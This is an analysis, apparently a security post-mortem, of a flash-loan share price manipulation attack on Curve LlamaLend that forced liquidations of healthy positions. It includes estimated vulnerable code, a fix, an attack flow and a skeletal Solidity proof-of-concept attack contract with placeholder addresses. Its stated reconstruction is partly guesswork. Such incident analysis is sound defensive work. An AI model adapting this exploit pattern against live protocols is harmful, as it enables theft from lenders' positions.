# Curve LlamaLend — Share Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2026-03-02 |
| **Protocol** | Curve LlamaLend |
| **Chain** | Ethereum |
| **Loss** | ~$240,000 |
| **Attacker** | Unknown |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | Curve LlamaLend crvUSD Controller |
| **Root Cause** | Yearn V3 vault share price manipulation via Morpho Blue flash loan, triggering incorrect liquidations |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

Curve LlamaLend is a lending protocol that uses crvUSD as collateral, internally referencing the share price of a Yearn V3 vault to calculate collateral value.

The attacker manipulated the vault's share price temporarily through the following steps:

1. Secured large capital via a **Morpho Blue flash loan**
2. Purchased large amounts of crvUSD through **Curve stable swap**
3. Deposited funds into the **Yearn V3 vault** → artificially inflated share price
4. Queried `users_to_liquidate()` to identify liquidatable positions
5. Forcibly liquidated healthy positions based on the manipulated price to extract profit
6. Withdrew funds from the vault and repaid the flash loan

The core issue is that LlamaLend's collateral price calculation **directly depends on the external vault's share price**, and this value can be manipulated within a single block through large-scale liquidity movements.

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (estimated)

```solidity
// ❌ Vulnerable: directly references the current share price of the Yearn vault
function getCollateralValue(address user) public view returns (uint256) {
    uint256 shares = userShares[user];
    // pricePerShare() can be manipulated via large deposits within a single block
    uint256 pricePerShare = IYearnVault(yearnVault).pricePerShare();
    return shares * pricePerShare / 1e18;
}

function users_to_liquidate() external view returns (address[] memory) {
    // ❌ Vulnerable: liquidation targets computed based on manipulated share price
    address[] memory result;
    for (uint i = 0; i < users.length; i++) {
        if (getCollateralValue(users[i]) < getDebt(users[i])) {
            result.push(users[i]);
        }
    }
    return result;
}
```

### Fixed Code

```solidity
// ✅ Fixed: use TWAP or minimum-based price
function getCollateralValue(address user) public view returns (uint256) {
    uint256 shares = userShares[user];
    // ✅ Use average share price over the last N blocks (TWAP)
    uint256 pricePerShare = _getTWAPPricePerShare(yearnVault, TWAP_PERIOD);
    return shares * pricePerShare / 1e18;
}

function _getTWAPPricePerShare(address vault, uint256 period)
    internal view returns (uint256)
{
    // Reference Chainlink or an internal TWAP oracle
    return ITWAPOracle(oracle).getAveragePricePerShare(vault, period);
}
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─[1] Large flash loan from Morpho Blue (USDC/ETH)
  │         │
  │         ▼
  ├─[2] Curve Stable Swap → bulk crvUSD purchase
  │         │  crvUSD pool price rises
  │         ▼
  ├─[3] Deposit crvUSD into Yearn V3 Vault
  │         │  pricePerShare() spikes
  │         ▼
  ├─[4] LlamaLend: call users_to_liquidate()
  │         │  Manipulated price → healthy positions classified as liquidatable
  │         ▼
  ├─[5] Execute liquidations → acquire collateral at below-market price
  │         │
  │         ▼
  ├─[6] Withdraw crvUSD from Yearn Vault
  │         │  pricePerShare() normalizes
  │         ▼
  ├─[7] Curve Stable Swap → sell crvUSD
  │         │
  │         ▼
  └─[8] Repay Morpho Blue flash loan + collect profit
              ~$240,000 net profit
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMorphoBlue {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

interface IYearnVault {
    function deposit(uint256 amount) external returns (uint256);
    function withdraw(uint256 shares) external returns (uint256);
    function pricePerShare() external view returns (uint256);
}

interface ILlamaLend {
    function users_to_liquidate() external view returns (address[] memory);
    function liquidate(address user, uint256 minCollateral) external;
}

contract LlamaLendAttack {
    IMorphoBlue constant morpho = IMorphoBlue(0x...);
    ICurvePool constant curvePool = ICurvePool(0x...);
    IYearnVault constant yearnVault = IYearnVault(0x...);
    ILlamaLend constant llamaLend = ILlamaLend(0x...);

    function attack() external {
        // [1] Borrow large USDC via Morpho Blue flash loan
        morpho.flashLoan(USDC, 50_000_000e6, abi.encode("attack"));
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
        // [2] Swap USDC → crvUSD in bulk (Curve stable swap)
        uint256 crvUSDAmount = curvePool.exchange(0, 1, amount, 0);

        // [3] Deposit into Yearn vault to manipulate pricePerShare
        uint256 shares = yearnVault.deposit(crvUSDAmount);

        // [4] Query liquidation targets based on manipulated price
        address[] memory victims = llamaLend.users_to_liquidate();

        // [5] Liquidate each victim's position
        for (uint i = 0; i < victims.length; i++) {
            llamaLend.liquidate(victims[i], 0);
        }

        // [6] Withdraw funds from vault (price normalizes)
        yearnVault.withdraw(shares);

        // [7] Swap crvUSD → USDC in reverse
        curvePool.exchange(1, 0, crvUSDAmount, 0);

        // [8] Repay flash loan (approve USDC; Morpho auto-collects)
        IERC20(USDC).approve(address(morpho), amount + fee);
    }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Share Price Manipulation |
| **Attack Vector** | Flash loan + vault deposit/withdrawal |
| **Impact Scope** | Entire protocol liquidation mechanism |
| **DASP Classification** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |

### Detailed Description

This vulnerability falls under the **single-block oracle manipulation** pattern, not a variant of **Read-Only Reentrancy**. The Yearn vault's `pricePerShare()` is calculated based on the vault's current-block balance, so calling it immediately after a large deposit returns an artificially inflated value.

Because LlamaLend consumes this value as a spot price without a TWAP, the liquidation threshold judgment is distorted and healthy positions get liquidated.

---

## 6. Remediation Recommendations

1. **Introduce TWAP Oracle**: Calculate the vault's share price using a minimum 10–30 minute TWAP to prevent single-block manipulation
2. **Use Minimum Value**: Use the lower of spot price and TWAP for collateral valuation
3. **Flash Loan Defense**: Detect and block composite deposit-then-liquidate transactions within the same block
4. **Chainlink Integration**: Add an independent external price feed to reduce reliance on vault-internal pricing
5. **Liquidation Delay**: Require a delay of at least 1 block before executing liquidations to prevent price manipulation

---

## 7. Lessons Learned

- **External vault spot prices are not trustworthy**: In a DeFi environment where large liquidity movements occur, directly using an arbitrary vault's `pricePerShare()` as an oracle is dangerous.
- **Flash loans threaten all price references**: In a flash loan environment where hundreds of millions of dollars can be moved within a single block, block-level spot price references are inherently manipulable.
- **Liquidation mechanisms require the strongest oracle protections**: Because liquidations cause direct losses to users, the reliability of the price feed is especially critical.
- **Additional verification is required when integrating multiple protocols**: The more protocols are composed together, the more each integration point must be independently reviewed for manipulation potential.